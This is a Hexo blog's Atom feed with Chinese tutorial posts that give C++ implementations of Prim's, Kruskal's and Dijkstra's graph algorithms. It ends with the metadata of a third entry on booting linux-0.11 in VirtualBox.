<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>emmm&#39;s blog</title>
  
  
  <link href="https://h4ckf0rfun.github.io/atom.xml" rel="self"/>
  
  <link href="https://h4ckf0rfun.github.io/"/>
  <updated>2022-11-19T18:51:43.353Z</updated>
  <id>https://h4ckf0rfun.github.io/</id>
  
  <author>
    <name>emmm</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>图-最小生成树</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</id>
    <published>2022-11-19T18:42:45.000Z</published>
    <updated>2022-11-19T18:51:43.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="图-最小生成树"><a href="#图-最小生成树" class="headerlink" title="图-最小生成树"></a>图-最小生成树</h1><h1 id="概念"><a href="#概念" class="headerlink" title="概念:"></a>概念:</h1><p>树是一类特殊的无向图。树中不能有回路。树必须是连同图。n个点有n-1条边。</p><p>生成树:：图中包含的一颗树。要求包含所有的节点，保留一部分边。生成树并不唯一。</p><p>最小生成树：所有生成树中所有边的权重和最小的生成树。</p><h1 id="寻找最小生成树"><a href="#寻找最小生成树" class="headerlink" title="寻找最小生成树:"></a>寻找最小生成树:</h1><h2 id="1-Prim‘s-Algorithm"><a href="#1-Prim‘s-Algorithm" class="headerlink" title="1.Prim‘s Algorithm"></a>1.Prim‘s Algorithm</h2><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程:"></a>算法流程:</h3><ol><li>初始时，任选一个节点作为一棵树 T</li><li>寻找图中 与 T相连的节点，选取这些节点中与T之间权值最小的那个节点加入到T中</li><li>重复步骤2，直到T包含图中所有的节点。</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现:"></a>代码实现:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::priority_queue;</span><br><span class="line"><span class="keyword">using</span> std::pair;</span><br><span class="line"><span class="keyword">using</span> std::set;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> std::list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line"><span class="type">int</span> vertex[<span class="number">2</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;Edge&gt; <span class="title">Prim</span><span class="params">(<span class="type">const</span> vector&lt;list&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; &amp;G,<span class="type">int</span> vertexs)</span></span>&#123;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; vertex_in_tree;</span><br><span class="line">vector&lt;Edge&gt; ret;</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (vertex_in_tree.<span class="built_in">size</span>() &lt; vertexs)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//去找出与当前树的距离最短的那个节点.</span></span><br><span class="line">Edge t;</span><br><span class="line">t.weight = UINT_MAX;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;vertex : vertex_in_tree)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;neighbor : G[vertex])&#123;</span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(neighbor.first) == vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line"><span class="keyword">if</span> (neighbor.second &lt; t.weight)&#123;</span><br><span class="line">t.vertex[<span class="number">0</span>] = vertex;</span><br><span class="line">t.vertex[<span class="number">1</span>] = neighbor.first;</span><br><span class="line">t.weight = neighbor.second;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//found.....</span></span><br><span class="line"><span class="built_in">assert</span>(t.weight != UINT_MAX);</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(t.vertex[<span class="number">1</span>]);<span class="comment">//1是新找到的节点.</span></span><br><span class="line">ret.<span class="built_in">push_back</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> edges, vertexs;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;edges, &amp;vertexs);</span><br><span class="line">vector&lt;list&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; G;</span><br><span class="line">G.<span class="built_in">resize</span>(vertexs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//input graph...</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; edges; i++)&#123;</span><br><span class="line"><span class="type">int</span> x, y, z;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class="line">G[y - <span class="number">1</span>].<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(z - <span class="number">1</span>, x));</span><br><span class="line">G[z - <span class="number">1</span>].<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(y - <span class="number">1</span>, x));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> g = <span class="built_in">Prim</span>(G, vertexs);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;vertex : g)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, vertex.weight,vertex.vertex[<span class="number">0</span>] + <span class="number">1</span>,vertex.vertex[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Kruskal‘s-Algorithm"><a href="#2-Kruskal‘s-Algorithm" class="headerlink" title="2.Kruskal‘s Algorithm"></a>2.Kruskal‘s Algorithm</h2><h3 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程:"></a>算法流程:</h3><ol><li>将所有边按权值从小到大排序。</li><li>从排序号的边中选出最小的一个。若该边的两个端点已经连同，忽略。否则将这条边作为最小生成树的一条边。</li><li>重复步骤2，直到所有的节点都属于同一棵树。</li></ol><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现:"></a>代码实现:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::priority_queue;</span><br><span class="line"><span class="keyword">using</span> std::pair;</span><br><span class="line"><span class="keyword">using</span> std::set;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line"><span class="type">int</span> vertex[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Edge&amp; left, <span class="type">const</span> Edge&amp; right)&#123;</span><br><span class="line"><span class="keyword">return</span> left.weight &gt; right.weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10 6</span></span><br><span class="line"><span class="comment">19 1 5</span></span><br><span class="line"><span class="comment">21 1 6</span></span><br><span class="line"><span class="comment">33 5 6</span></span><br><span class="line"><span class="comment">16 1 2</span></span><br><span class="line"><span class="comment">18 5 4</span></span><br><span class="line"><span class="comment">11 6 2</span></span><br><span class="line"><span class="comment">14 6 4</span></span><br><span class="line"><span class="comment">6 2 4</span></span><br><span class="line"><span class="comment">5 2 3</span></span><br><span class="line"><span class="comment">10 4 3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">5 2 3</span></span><br><span class="line"><span class="comment">6 2 4</span></span><br><span class="line"><span class="comment">11 6 2</span></span><br><span class="line"><span class="comment">16 1 2</span></span><br><span class="line"><span class="comment">18 5 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">vector&lt;Edge&gt; <span class="title">Kruskal</span><span class="params">(<span class="type">const</span> vector&lt;Edge&gt;&amp; G, <span class="type">int</span> vertexs)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">将所有边按权重从小到大排序</span></span><br><span class="line"><span class="comment">然后选出边加入到树中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">vector&lt;Edge&gt;ret;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; vertex_in_tree;</span><br><span class="line">priority_queue &lt; Edge&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; edge : G)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(edge);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">while</span> (vertex_in_tree.<span class="built_in">size</span>() &lt; vertexs)&#123;</span><br><span class="line"><span class="keyword">auto</span> t = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">0</span>]) != vertex_in_tree.<span class="built_in">end</span>() &amp;&amp;</span><br><span class="line">vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">1</span>]) != vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line"><span class="comment">//已经连通了，再加就有回路了。</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//save edge</span></span><br><span class="line">ret.<span class="built_in">push_back</span>(t);</span><br><span class="line"></span><br><span class="line"><span class="comment">//add vertex to tree.</span></span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">0</span>]) == vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(t.vertex[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">1</span>]) == vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(t.vertex[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> edges = <span class="number">0</span>,vertexs = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;edges, &amp;vertexs);</span><br><span class="line"></span><br><span class="line">vector&lt;Edge&gt; G;</span><br><span class="line">G.<span class="built_in">resize</span>(edges);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; edges; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;G[i].weight, &amp;G[i].vertex[<span class="number">0</span>], &amp;G[i].vertex[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">auto</span> g = <span class="built_in">Kruskal</span>(G, vertexs);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;vertex : g)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, vertex.weight,vertex.vertex[<span class="number">0</span>],vertex.vertex[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;图-最小生成树&quot;&gt;&lt;a href=&quot;#图-最小生成树&quot; class=&quot;headerlink&quot; title=&quot;图-最小生成树&quot;&gt;&lt;/a&gt;图-最小生成树&lt;/h1&gt;&lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>图-dijkstra</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-dijkstra/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-dijkstra/</id>
    <published>2022-11-19T18:40:42.000Z</published>
    <updated>2022-11-19T18:41:48.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="图-Dijkstra算法"><a href="#图-Dijkstra算法" class="headerlink" title="图-Dijkstra算法"></a>图-Dijkstra算法</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>Dijkstra算法是用来求有向图中的最短路径的。</p><p>在经过该算法后，能得到这样一个表:</p><table><thead><tr><th>vertex</th><th>dist</th><th>from</th></tr></thead><tbody><tr><td>0</td><td></td><td></td></tr><tr><td>1</td><td></td><td></td></tr><tr><td>2</td><td></td><td></td></tr><tr><td>…</td><td></td><td></td></tr></tbody></table><p>其中vertex是图中的每一个节点，dist代表从起始位置到该节点的路径长度是多少，from表示该节点的商上游结点。</p><h2 id="算法流程："><a href="#算法流程：" class="headerlink" title="算法流程："></a>算法流程：</h2><p>准备工作：</p><ol><li>输入图G</li><li>初始化上面的表格，一开始距离起点的距离都是∞</li></ol><p>算法开始:</p><p>设起点为s,优先队列q.</p><ol><li>更新 表中s 的distance和from，由于s的distance改变了，下游节点会受到影响，因此将s 加入优先队列q</li><li>当q不为空的时候，取出q的第一个元素t，现在要继续遍历t的下游节点，如果从t到下游节点有更短的dist，就更新dist的值，并把下游节点加入到队列。</li></ol><p>(如果某个节点v的distance改变了，<strong>v的下游的节点会受到影响</strong>，因此我们先把v保存 到队列中，等一会儿再从队里中取出v，然后更新v的下游节点)</p><h2 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::list;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> std::pair;</span><br><span class="line"><span class="keyword">using</span> std::priority_queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">path</span>&#123;</span><br><span class="line"><span class="type">int</span> vertex;<span class="comment">//那个节点</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> distance;<span class="comment">//距离起点的距离.</span></span><br><span class="line"><span class="type">int</span> from;<span class="comment">//上游节点.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span>  <span class="keyword">operator</span> &lt;(<span class="type">const</span> path&amp; left, <span class="type">const</span> path&amp; right)&#123;</span><br><span class="line"><span class="keyword">return</span> left.distance &gt; right.distance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 节点 + 权值</span></span><br><span class="line">vector&lt;list&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt;  G;</span><br><span class="line">vector&lt;path&gt; result;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dijkstra</span><span class="params">(<span class="type">int</span> start_vertex)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">priority_queue&lt;path&gt; q;</span><br><span class="line"></span><br><span class="line">result[start_vertex].distance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">q.<span class="built_in">push</span>(result[start_vertex]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>())&#123;</span><br><span class="line"><span class="keyword">auto</span>  top = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历top 的下游节点，如果有更短的，则更新并且把下游节点装入队列。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;next : G[top.vertex])&#123;</span><br><span class="line"><span class="comment">//有更短的。</span></span><br><span class="line"><span class="keyword">if</span> (top.distance + next.second &lt; result[next.first].distance)&#123;</span><br><span class="line"><span class="comment">//更新</span></span><br><span class="line">result[next.first].distance = top.distance + next.second;</span><br><span class="line">result[next.first].from = top.vertex;</span><br><span class="line"></span><br><span class="line"><span class="comment">//入队，必须要这样，因为下游节点可能会受到影响</span></span><br><span class="line">q.<span class="built_in">push</span>(result[next.first]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">6 10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0 1 50</span></span><br><span class="line"><span class="comment">1 2 10</span></span><br><span class="line"><span class="comment">0 3 10</span></span><br><span class="line"><span class="comment">3 0 20</span></span><br><span class="line"><span class="comment">1 3 15</span></span><br><span class="line"><span class="comment">3 4 15</span></span><br><span class="line"><span class="comment">4 1 20</span></span><br><span class="line"><span class="comment">4 2 35</span></span><br><span class="line"><span class="comment">2 4 30</span></span><br><span class="line"><span class="comment">5 4 3</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//input graph;</span></span><br><span class="line"><span class="type">int</span> edges, vertex;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;vertex, &amp;edges);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">result.<span class="built_in">resize</span>(vertex);</span><br><span class="line">G.<span class="built_in">resize</span>(vertex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">result[i].vertex = i;</span><br><span class="line">result[i].from = <span class="number">-1</span>;</span><br><span class="line">result[i].distance = UINT_MAX;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; edges; i++)&#123;</span><br><span class="line"><span class="type">int</span> x, y, z;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;y, &amp;z);</span><br><span class="line">G[x].<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(y, z));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> start_vertex;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;start_vertex);</span><br><span class="line"><span class="built_in">dijkstra</span>(start_vertex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10s%10s%10s\n&quot;</span>,<span class="string">&quot;vertex&quot;</span>,<span class="string">&quot;dist&quot;</span>,<span class="string">&quot;from&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;path : result)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10d%10d%10d\n&quot;</span>, path.vertex + <span class="number">1</span>, path.distance, path.from + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(上述代码中有向图的保存是使用邻接矩阵)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;图-Dijkstra算法&quot;&gt;&lt;a href=&quot;#图-Dijkstra算法&quot; class=&quot;headerlink&quot; title=&quot;图-Dijkstra算法&quot;&gt;&lt;/a&gt;图-Dijkstra算法&lt;/h1&gt;&lt;h2 id=&quot;概述：&quot;&gt;&lt;a href=&quot;#概述：&quot; class</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>linux-0.11学习记录-使用VirtualBox启动linux-0.11</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/</id>
    <published>2022-11-17T17:22:27.000Z</published>
    <updated>2022-11-17T17:24:37.086Z</updated>
    
